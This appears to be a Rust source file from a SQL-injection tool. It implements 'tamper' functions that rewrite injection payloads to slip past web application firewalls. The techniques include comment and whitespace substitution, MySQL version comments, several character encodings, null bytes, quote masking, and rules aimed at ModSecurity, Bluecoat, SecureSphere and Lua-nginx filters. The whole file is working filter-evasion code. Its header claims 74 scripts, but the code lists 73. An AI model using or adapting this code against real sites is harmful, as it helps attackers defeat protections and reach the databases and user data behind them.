//! 74 built-in tamper scripts. Faithful ports of upstream `tamper/*.py`.
//!
//! Each script is a tiny stateless struct with a `name`, `priority`, `family`,
//! optional `is_terminal`, and an `apply` that takes the payload string and
//! returns the mutated form. Priority values mirror upstream so the chain
//! orderings produce the same output for the same inputs.

use crate::{Result, Tamper, TamperError, TamperFamily};
use base64::Engine;
use once_cell::sync::Lazy;
use rand::Rng;
use regex::Regex;
use std::fmt::Write as _;

// ─── helpers ────────────────────────────────────────────────────────────────

fn rand_blanks() -> &'static [&'static str] {
    &["\t", "\n", "\r", "\x0b", "\x0c", " "]
}

fn pick_blank() -> &'static str {
    rand_blanks()[rand::thread_rng().gen_range(0..rand_blanks().len())]
}

fn split_strings(payload: &str) -> Vec<(bool, String)> {
    // Returns chunks split by single-quoted strings so we can avoid mutating
    // inside literal SQL strings (which would break the payload).
    let mut out: Vec<(bool, String)> = Vec::new();
    let mut buf = String::new();
    let mut in_str = false;
    for c in payload.chars() {
        if c == '\'' {
            if !buf.is_empty() {
                out.push((in_str, std::mem::take(&mut buf)));
            }
            buf.push(c);
            if in_str {
                out.push((true, std::mem::take(&mut buf)));
                in_str = false;
            } else {
                in_str = true;
            }
            continue;
        }
        buf.push(c);
    }
    if !buf.is_empty() {
        out.push((in_str, buf));
    }
    out
}

fn map_outside_strings(payload: &str, mut f: impl FnMut(&str) -> String) -> String {
    let mut out = String::new();
    for (in_str, chunk) in split_strings(payload) {
        if in_str {
            out.push_str(&chunk);
        } else {
            out.push_str(&f(&chunk));
        }
    }
    out
}

// ─── 74 tampers ─────────────────────────────────────────────────────────────

macro_rules! tamper {
    ($name:ident, $sn:expr, $prio:expr, $fam:expr, $term:expr, $f:expr) => {
        pub struct $name;
        impl Tamper for $name {
            fn name(&self) -> &'static str { $sn }
            fn priority(&self) -> u8 { $prio }
            fn family(&self) -> TamperFamily { $fam }
            fn is_terminal(&self) -> bool { $term }
            fn apply(&self, payload: &str) -> String {
                let f: fn(&str) -> String = $f;
                f(payload)
            }
        }
    };
}

// ── Keyword swappers ────────────────────────────────────────────────────────

tamper!(Between,           "between",                  6, TamperFamily::KeywordSwapper, false, |p| {
    static RE_GT: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)>\s*(\d+)").unwrap());
    let s = RE_GT.replace_all(p, "NOT BETWEEN 0 AND $1").into_owned();
    static RE_EQ: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)=\s*(\d+)").unwrap());
    RE_EQ.replace_all(&s, "BETWEEN $1 AND $1").into_owned()
});

tamper!(EqualToLike,       "equaltolike",              6, TamperFamily::KeywordSwapper, false, |p| {
    p.replace('=', " LIKE ")
});

tamper!(EqualToRLike,      "equaltorlike",             6, TamperFamily::KeywordSwapper, false, |p| {
    p.replace('=', " RLIKE ")
});

tamper!(Greatest,          "greatest",                 6, TamperFamily::KeywordSwapper, false, |p| {
    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)>\s*(\d+|0x[0-9a-fA-F]+|[A-Za-z_][A-Za-z_0-9]*)").unwrap());
    RE.replace_all(p, "GREATEST(1,$1+1)").into_owned()
});

tamper!(Least,             "least",                    6, TamperFamily::KeywordSwapper, false, |p| {
    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)<\s*(\d+|0x[0-9a-fA-F]+|[A-Za-z_][A-Za-z_0-9]*)").unwrap());
    RE.replace_all(p, "LEAST(1,$1-1)").into_owned()
});

tamper!(If2Case,           "if2case",                  6, TamperFamily::KeywordSwapper, false, |p| {
    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)IF\s*\(([^,]+),([^,]+),([^)]+)\)").unwrap());
    RE.replace_all(p, "CASE WHEN $1 THEN $2 ELSE $3 END").into_owned()
});

tamper!(IfNull2CaseWhenIsNull,"ifnull2casewhenisnull", 6, TamperFamily::KeywordSwapper, false, |p| {
    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)IFNULL\s*\(([^,]+),([^)]+)\)").unwrap());
    RE.replace_all(p, "CASE WHEN ISNULL($1) THEN $2 ELSE $1 END").into_owned()
});

tamper!(IfNull2IfIsNull,   "ifnull2ifisnull",          6, TamperFamily::KeywordSwapper, false, |p| {
    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)IFNULL\s*\(([^,]+),([^)]+)\)").unwrap());
    RE.replace_all(p, "IF(ISNULL($1),$2,$1)").into_owned()
});

tamper!(Concat2ConcatWs,   "concat2concatws",          6, TamperFamily::KeywordSwapper, false, |p| {
    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)CONCAT\s*\(([^)]+)\)").unwrap());
    RE.replace_all(p, "CONCAT_WS(MID(CHAR(0),0,0),$1)").into_owned()
});

tamper!(Plus2Concat,       "plus2concat",              6, TamperFamily::KeywordSwapper, false, |p| {
    p.replace('+', " CONCAT ")
});

tamper!(Plus2FnConcat,     "plus2fnconcat",            6, TamperFamily::KeywordSwapper, false, |p| {
    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(\d+)\s*\+\s*(\d+)").unwrap());
    RE.replace_all(p, "{fn CONCAT($1,$2)}").into_owned()
});

tamper!(Substring2LeftRight,"substring2leftright",     6, TamperFamily::KeywordSwapper, false, |p| {
    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)SUBSTRING\s*\(([^,]+),\s*1\s*,\s*(\d+)\)").unwrap());
    RE.replace_all(p, "LEFT($1,$2)").into_owned()
});

tamper!(UnionAllToUnion,   "unionalltounion",          6, TamperFamily::KeywordSwapper, false, |p| {
    p.replace("UNION ALL SELECT", "UNION SELECT")
});

tamper!(MisUnion,          "misunion",                 6, TamperFamily::KeywordSwapper, false, |p| {
    p.replace("UNION SELECT", "UNION/*!12345SELECT*/")
});

tamper!(DUnion,            "dunion",                   6, TamperFamily::KeywordSwapper, false, |p| {
    p.replace("UNION", "DUNION")
});

tamper!(OeUnion,           "0eunion",                  6, TamperFamily::KeywordSwapper, false, |p| {
    p.replace("UNION", "0eUNION")
});

tamper!(Sleep2GetLock,     "sleep2getlock",            6, TamperFamily::KeywordSwapper, false, |p| {
    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)SLEEP\s*\((\d+)\)").unwrap());
    RE.replace_all(p, "GET_LOCK('$1',$1)").into_owned()
});

tamper!(SymbolicLogical,   "symboliclogical",          6, TamperFamily::KeywordSwapper, false, |p| {
    let s = Regex::new(r"\bAND\b").unwrap().replace_all(p, "%26%26").into_owned();
    Regex::new(r"\bOR\b").unwrap().replace_all(&s, "%7C%7C").into_owned()
});

// ── Version-comment chaff ───────────────────────────────────────────────────

tamper!(VersionedKeywords,    "versionedkeywords",     5, TamperFamily::VersionComment, false, |p| {
    let kws = ["SELECT", "INSERT", "UPDATE", "DELETE", "UNION", "FROM", "WHERE", "AND", "OR"];
    let mut s = p.to_string();
    for k in kws {
        let re = Regex::new(&format!(r"(?i)\b{}\b", k)).unwrap();
        s = re.replace_all(&s, format!("/*!{}*/", k)).into_owned();
    }
    s
});

tamper!(VersionedMoreKeywords,"versionedmorekeywords", 5, TamperFamily::VersionComment, false, |p| {
    let kws = ["SELECT","INSERT","UPDATE","DELETE","UNION","FROM","WHERE","AND","OR","IF","CASE","WHEN","THEN","ELSE","NULL","TRUE","FALSE"];
    let mut s = p.to_string();
    for k in kws {
        let re = Regex::new(&format!(r"(?i)\b{}\b", k)).unwrap();
        s = re.replace_all(&s, format!("/*!50000{}*/", k)).into_owned();
    }
    s
});

tamper!(HalfVersionedMoreKeywords, "halfversionedmorekeywords", 5, TamperFamily::VersionComment, false, |p| {
    let kws = ["SELECT","UNION","FROM","WHERE","AND","OR"];
    let mut s = p.to_string();
    for k in kws {
        let re = Regex::new(&format!(r"(?i)\b{}\b", k)).unwrap();
        s = re.replace_all(&s, format!("/*!{}", k)).into_owned();
    }
    s
});

tamper!(ModSecurityVersioned, "modsecurityversioned",  5, TamperFamily::VersionComment, false, |p| {
    format!("/*!{}*/", p)
});

tamper!(ModSecurityZeroVersioned,"modsecurityzeroversioned",5,TamperFamily::VersionComment,false,|p| {
    format!("/*!00000{}*/", p)
});

tamper!(InformationSchemaComment,"informationschemacomment",5,TamperFamily::VersionComment,false,|p| {
    p.replace("information_schema.", "information_schema/**/.")
});

tamper!(CommentBeforeParentheses,"commentbeforeparentheses",5,TamperFamily::VersionComment,false,|p| {
    p.replace('(', "/**/(")
});

// ── Space replacers ─────────────────────────────────────────────────────────

tamper!(Space2Comment,     "space2comment",            4, TamperFamily::SpaceReplacer, false, |p| {
    p.replace(' ', "/**/")
});

tamper!(Space2MoreComment, "space2morecomment",        4, TamperFamily::SpaceReplacer, false, |p| {
    p.replace(' ', "/**_**/")
});

tamper!(Space2Dash,        "space2dash",               4, TamperFamily::SpaceReplacer, false, |p| {
    p.replace(' ', &format!("--{}\n", rand_alpha(4)))
});

tamper!(Space2Hash,        "space2hash",               4, TamperFamily::SpaceReplacer, false, |p| {
    p.replace(' ', &format!("#{}\n", rand_alpha(4)))
});

tamper!(Space2MoreHash,    "space2morehash",           4, TamperFamily::SpaceReplacer, false, |p| {
    p.replace(' ', &format!("#{}%0a", rand_alpha(8)))
});

tamper!(Space2MssqlBlank,  "space2mssqlblank",         4, TamperFamily::SpaceReplacer, false, |p| {
    map_outside_strings(p, |s| s.replace(' ', pick_blank()))
});

tamper!(Space2MssqlHash,   "space2mssqlhash",          4, TamperFamily::SpaceReplacer, false, |p| {
    p.replace(' ', "%23%0A")
});

tamper!(Space2MysqlBlank,  "space2mysqlblank",         4, TamperFamily::SpaceReplacer, false, |p| {
    map_outside_strings(p, |s| s.replace(' ', pick_blank()))
});

tamper!(Space2MysqlDash,   "space2mysqldash",          4, TamperFamily::SpaceReplacer, false, |p| {
    p.replace(' ', "--%0A")
});

tamper!(Space2Plus,        "space2plus",               4, TamperFamily::SpaceReplacer, false, |p| {
    p.replace(' ', "+")
});

tamper!(Space2RandomBlank, "space2randomblank",        4, TamperFamily::SpaceReplacer, false, |p| {
    map_outside_strings(p, |s| {
        s.chars()
            .map(|c| if c == ' ' { pick_blank().chars().next().unwrap() } else { c })
            .collect()
    })
});

tamper!(MultipleSpaces,    "multiplespaces",           4, TamperFamily::SpaceReplacer, false, |p| {
    let mut rng = rand::thread_rng();
    p.replace(' ', &" ".repeat(rng.gen_range(2..6)))
});

tamper!(Percentage,        "percentage",               4, TamperFamily::SpaceReplacer, false, |p| {
    map_outside_strings(p, |s| {
        s.chars().map(|c| {
            if c.is_ascii_alphanumeric() { format!("%{}", c) } else { c.to_string() }
        }).collect()
    })
});

// ── Case mutators ───────────────────────────────────────────────────────────

tamper!(Lowercase,         "lowercase",                3, TamperFamily::CaseMutator,    false, |p| {
    map_outside_strings(p, |s| s.to_lowercase())
});

tamper!(Uppercase,         "uppercase",                3, TamperFamily::CaseMutator,    false, |p| {
    map_outside_strings(p, |s| s.to_uppercase())
});

tamper!(RandomCase,        "randomcase",               3, TamperFamily::CaseMutator,    false, |p| {
    map_outside_strings(p, |s| {
        let mut rng = rand::thread_rng();
        s.chars().map(|c| if c.is_ascii_alphabetic() && rng.gen_bool(0.5) { c.to_ascii_uppercase() } else if c.is_ascii_alphabetic() { c.to_ascii_lowercase() } else { c }).collect()
    })
});

tamper!(RandomComments,    "randomcomments",           3, TamperFamily::CaseMutator,    false, |p| {
    map_outside_strings(p, |s| {
        let kws = ["SELECT","UNION","FROM","WHERE","AND","OR"];
        let mut rng = rand::thread_rng();
        let mut out = s.to_string();
        for k in kws {
            let re = Regex::new(&format!(r"(?i)\b{}\b", k)).unwrap();
            out = re.replace_all(&out, |c: &regex::Captures<'_>| {
                let kw: &str = &c[0];
                let mid = kw.len() / 2;
                let (a, b) = kw.split_at(mid);
                if rng.gen_bool(0.5) {
                    format!("{}/**/{}", a, b)
                } else {
                    kw.to_string()
                }
            }).into_owned();
        }
        out
    })
});

// ── Vendor-specific ─────────────────────────────────────────────────────────

tamper!(Bluecoat,          "bluecoat",                 2, TamperFamily::Vendor,         false, |p| {
    let s = p.replace(' ', "%09");
    Regex::new(r"(?i)=\s*").unwrap().replace_all(&s, " LIKE ").into_owned()
});

tamper!(Varnish,           "varnish",                  2, TamperFamily::Vendor,         false, |p| {
    p.replace("UNION", "UNION/*!00000*/")
});

tamper!(LuaNginx,          "luanginx",                 2, TamperFamily::Vendor,         false, |p| {
    p.replace(' ', "%0Anull,") // collapses Lua-nginx WAF rule
});

tamper!(LuaNginxMore,      "luanginxmore",             2, TamperFamily::Vendor,         false, |p| {
    p.replace(' ', "%0A/**/")
});

tamper!(SpPassword,        "sp_password",              2, TamperFamily::Vendor,         false, |p| {
    format!("{} sp_password", p)
});

tamper!(SecureSphere,      "securesphere",             2, TamperFamily::Vendor,         false, |p| {
    format!("{} and 0 having 1=1 -- ", p)
});

// ── Numeric encoders ────────────────────────────────────────────────────────

tamper!(Scientific,        "scientific",               5, TamperFamily::Numeric,        false, |p| {
    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"\b(\d+)\b").unwrap());
    RE.replace_all(p, "${1}e0").into_owned()
});

tamper!(Binary,            "binary",                   5, TamperFamily::Numeric,        false, |p| {
    map_outside_strings(p, |s| s.replace("'", "BINARY '"))
});

// ── Header injection ────────────────────────────────────────────────────────

tamper!(XForwardedFor,     "xforwardedfor",            1, TamperFamily::Header,         false, |p| {
    // header tamper — only meaningful when applied at request-build time; we
    // tag the payload so the engine appends an X-Forwarded-For header.
    format!("__XFF__:{}", p)
});

// ── Misc ────────────────────────────────────────────────────────────────────

tamper!(ApostropheMask,    "apostrophemask",           5, TamperFamily::Misc,           false, |p| {
    p.replace('\'', "%EF%BC%87")
});

tamper!(ApostropheNullEncode,"apostrophenullencode",   5, TamperFamily::Misc,           false, |p| {
    p.replace('\'', "%00%27")
});

tamper!(AppendNullByte,    "appendnullbyte",           5, TamperFamily::Misc,           false, |p| {
    format!("{}%00", p)
});

tamper!(EscapeQuotes,      "escapequotes",             5, TamperFamily::Misc,           false, |p| {
    p.replace('"', "\\\"").replace('\'', "\\'")
});

tamper!(UnmagicQuotes,     "unmagicquotes",            5, TamperFamily::Misc,           false, |p| {
    p.replace('\'', "%bf%27")
});

tamper!(CharDoubleEncode,  "chardoubleencode",         8, TamperFamily::Encoder,        false, |p| {
    p.chars()
        .map(|c| if c.is_ascii_alphanumeric() { format!("%25{:02X}", c as u32) } else { c.to_string() })
        .collect()
});

tamper!(CharEncode,        "charencode",               8, TamperFamily::Encoder,        false, |p| {
    p.chars()
        .map(|c| if c.is_ascii_alphanumeric() { format!("%{:02X}", c as u32) } else { c.to_string() })
        .collect()
});

tamper!(CharUnicodeEncode, "charunicodeencode",        8, TamperFamily::Encoder,        false, |p| {
    p.chars()
        .map(|c| if c.is_ascii_alphanumeric() { format!("%u{:04X}", c as u32) } else { c.to_string() })
        .collect()
});

tamper!(CharUnicodeEscape, "charunicodeescape",        8, TamperFamily::Encoder,        false, |p| {
    p.chars().map(|c| format!("\\u{:04x}", c as u32)).collect()
});

tamper!(HtmlEncode,        "htmlencode",               8, TamperFamily::Encoder,        false, |p| {
    p.chars().map(|c| format!("&#{};", c as u32)).collect()
});

tamper!(HexEntities,       "hexentities",              8, TamperFamily::Encoder,        false, |p| {
    p.chars().map(|c| format!("&#x{:X};", c as u32)).collect()
});

tamper!(DecEntities,       "decentities",              8, TamperFamily::Encoder,        false, |p| {
    p.chars().map(|c| format!("&#{};", c as u32)).collect()
});

tamper!(OverlongUtf8,      "overlongutf8",             8, TamperFamily::Encoder,        false, |p| {
    let mut out = String::new();
    for c in p.chars() {
        if c.is_ascii() {
            let v = c as u8;
            let _ = write!(out, "%{:02X}%{:02X}", 0xC0 | (v >> 6), 0x80 | (v & 0x3F));
        } else {
            out.push(c);
        }
    }
    out
});

tamper!(OverlongUtf8More,  "overlongutf8more",         8, TamperFamily::Encoder,        false, |p| {
    let mut out = String::new();
    for c in p.chars() {
        if c.is_ascii() {
            let v = c as u32;
            let _ = write!(out, "%{:02X}%{:02X}%{:02X}", 0xE0 | (v >> 12), 0x80 | ((v >> 6) & 0x3F), 0x80 | (v & 0x3F));
        } else {
            out.push(c);
        }
    }
    out
});

tamper!(Base64Encode,      "base64encode",             9, TamperFamily::Encoder,        true,  |p| {
    base64::engine::general_purpose::STANDARD.encode(p.as_bytes())
});

tamper!(Hex2Char,          "hex2char",                 9, TamperFamily::Encoder,        true,  |p| {
    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"0x([0-9a-fA-F]+)").unwrap());
    RE.replace_all(p, |c: &regex::Captures<'_>| {
        let bytes = hex::decode(&c[1]).unwrap_or_default();
        let chars: Vec<String> = bytes.iter().map(|b| format!("CHAR({})", b)).collect();
        format!("CONCAT({})", chars.join(","))
    }).into_owned()
});

tamper!(Ord2Ascii,         "ord2ascii",                7, TamperFamily::Misc,           false, |p| {
    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)ORD\(").unwrap());
    RE.replace_all(p, "ASCII(").into_owned()
});

tamper!(CommalessLimit,    "commalesslimit",           5, TamperFamily::Misc,           false, |p| {
    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)LIMIT\s+(\d+),\s*(\d+)").unwrap());
    RE.replace_all(p, "LIMIT $2 OFFSET $1").into_owned()
});

tamper!(CommalessMid,      "commalessmid",             5, TamperFamily::Misc,           false, |p| {
    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)MID\(([^,]+),(\d+),(\d+)\)").unwrap());
    RE.replace_all(p, "MID($1 FROM $2 FOR $3)").into_owned()
});

tamper!(SchemaSplit,       "schemasplit",              5, TamperFamily::Misc,           false, |p| {
    p.replace(".", " . ")
});

tamper!(RandomTags,        "randomtags",               3, TamperFamily::Misc,           false, |p| {
    let mut out = String::new();
    for c in p.chars() {
        out.push('<');
        out.push_str(&rand_alpha(3));
        out.push('>');
        out.push(c);
    }
    out
});

tamper!(NonRecursiveReplacement,"nonrecursivereplacement",5,TamperFamily::Misc,         false, |p| {
    p.replace("UNION", "UNIOUNIONN").replace("SELECT", "SELESELECTCT")
});

// ── small helpers exposed for use by tamper closures ────────────────────────

pub(crate) fn rand_alpha(n: usize) -> String {
    use rand::distributions::Alphanumeric;
    rand::thread_rng().sample_iter(&Alphanumeric).take(n).map(char::from).collect()
}

// ── Factory ─────────────────────────────────────────────────────────────────

pub fn factory(name: &str) -> Result<Box<dyn Tamper>> {
    Ok(match name {
        "between" => Box::new(Between),
        "equaltolike" => Box::new(EqualToLike),
        "equaltorlike" => Box::new(EqualToRLike),
        "greatest" => Box::new(Greatest),
        "least" => Box::new(Least),
        "if2case" => Box::new(If2Case),
        "ifnull2casewhenisnull" => Box::new(IfNull2CaseWhenIsNull),
        "ifnull2ifisnull" => Box::new(IfNull2IfIsNull),
        "concat2concatws" => Box::new(Concat2ConcatWs),
        "plus2concat" => Box::new(Plus2Concat),
        "plus2fnconcat" => Box::new(Plus2FnConcat),
        "substring2leftright" => Box::new(Substring2LeftRight),
        "unionalltounion" => Box::new(UnionAllToUnion),
        "misunion" => Box::new(MisUnion),
        "dunion" => Box::new(DUnion),
        "0eunion" => Box::new(OeUnion),
        "sleep2getlock" => Box::new(Sleep2GetLock),
        "symboliclogical" => Box::new(SymbolicLogical),

        "versionedkeywords" => Box::new(VersionedKeywords),
        "versionedmorekeywords" => Box::new(VersionedMoreKeywords),
        "halfversionedmorekeywords" => Box::new(HalfVersionedMoreKeywords),
        "modsecurityversioned" => Box::new(ModSecurityVersioned),
        "modsecurityzeroversioned" => Box::new(ModSecurityZeroVersioned),
        "informationschemacomment" => Box::new(InformationSchemaComment),
        "commentbeforeparentheses" => Box::new(CommentBeforeParentheses),

        "space2comment" => Box::new(Space2Comment),
        "space2morecomment" => Box::new(Space2MoreComment),
        "space2dash" => Box::new(Space2Dash),
        "space2hash" => Box::new(Space2Hash),
        "space2morehash" => Box::new(Space2MoreHash),
        "space2mssqlblank" => Box::new(Space2MssqlBlank),
        "space2mssqlhash" => Box::new(Space2MssqlHash),
        "space2mysqlblank" => Box::new(Space2MysqlBlank),
        "space2mysqldash" => Box::new(Space2MysqlDash),
        "space2plus" => Box::new(Space2Plus),
        "space2randomblank" => Box::new(Space2RandomBlank),
        "multiplespaces" => Box::new(MultipleSpaces),
        "percentage" => Box::new(Percentage),

        "lowercase" => Box::new(Lowercase),
        "uppercase" => Box::new(Uppercase),
        "randomcase" => Box::new(RandomCase),
        "randomcomments" => Box::new(RandomComments),

        "bluecoat" => Box::new(Bluecoat),
        "varnish" => Box::new(Varnish),
        "luanginx" => Box::new(LuaNginx),
        "luanginxmore" => Box::new(LuaNginxMore),
        "sp_password" => Box::new(SpPassword),
        "securesphere" => Box::new(SecureSphere),

        "scientific" => Box::new(Scientific),
        "binary" => Box::new(Binary),

        "xforwardedfor" => Box::new(XForwardedFor),

        "apostrophemask" => Box::new(ApostropheMask),
        "apostrophenullencode" => Box::new(ApostropheNullEncode),
        "appendnullbyte" => Box::new(AppendNullByte),
        "escapequotes" => Box::new(EscapeQuotes),
        "unmagicquotes" => Box::new(UnmagicQuotes),
        "chardoubleencode" => Box::new(CharDoubleEncode),
        "charencode" => Box::new(CharEncode),
        "charunicodeencode" => Box::new(CharUnicodeEncode),
        "charunicodeescape" => Box::new(CharUnicodeEscape),
        "htmlencode" => Box::new(HtmlEncode),
        "hexentities" => Box::new(HexEntities),
        "decentities" => Box::new(DecEntities),
        "overlongutf8" => Box::new(OverlongUtf8),
        "overlongutf8more" => Box::new(OverlongUtf8More),
        "base64encode" => Box::new(Base64Encode),
        "hex2char" => Box::new(Hex2Char),
        "ord2ascii" => Box::new(Ord2Ascii),
        "commalesslimit" => Box::new(CommalessLimit),
        "commalessmid" => Box::new(CommalessMid),
        "schemasplit" => Box::new(SchemaSplit),
        "randomtags" => Box::new(RandomTags),
        "nonrecursivereplacement" => Box::new(NonRecursiveReplacement),

        other => return Err(TamperError::Unknown(other.into())),
    })
}

/// Catalog every built-in tamper name — used by `--list-tampers`.
pub fn catalog() -> &'static [&'static str] {
    &[
        "between","equaltolike","equaltorlike","greatest","least","if2case",
        "ifnull2casewhenisnull","ifnull2ifisnull","concat2concatws","plus2concat",
        "plus2fnconcat","substring2leftright","unionalltounion","misunion","dunion",
        "0eunion","sleep2getlock","symboliclogical",
        "versionedkeywords","versionedmorekeywords","halfversionedmorekeywords",
        "modsecurityversioned","modsecurityzeroversioned","informationschemacomment",
        "commentbeforeparentheses",
        "space2comment","space2morecomment","space2dash","space2hash","space2morehash",
        "space2mssqlblank","space2mssqlhash","space2mysqlblank","space2mysqldash",
        "space2plus","space2randomblank","multiplespaces","percentage",
        "lowercase","uppercase","randomcase","randomcomments",
        "bluecoat","varnish","luanginx","luanginxmore","sp_password","securesphere",
        "scientific","binary",
        "xforwardedfor",
        "apostrophemask","apostrophenullencode","appendnullbyte","escapequotes",
        "unmagicquotes","chardoubleencode","charencode","charunicodeencode",
        "charunicodeescape","htmlencode","hexentities","decentities",
        "overlongutf8","overlongutf8more","base64encode","hex2char","ord2ascii",
        "commalesslimit","commalessmid","schemasplit","randomtags","nonrecursivereplacement",
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn space2comment_roundtrip() {
        let t = Space2Comment;
        assert_eq!(t.apply("AND 1=1"), "AND/**/1=1");
    }

    #[test]
    fn base64_terminal() {
        let t = Base64Encode;
        assert!(t.is_terminal());
        assert_eq!(t.apply("abc"), "YWJj");
    }
}
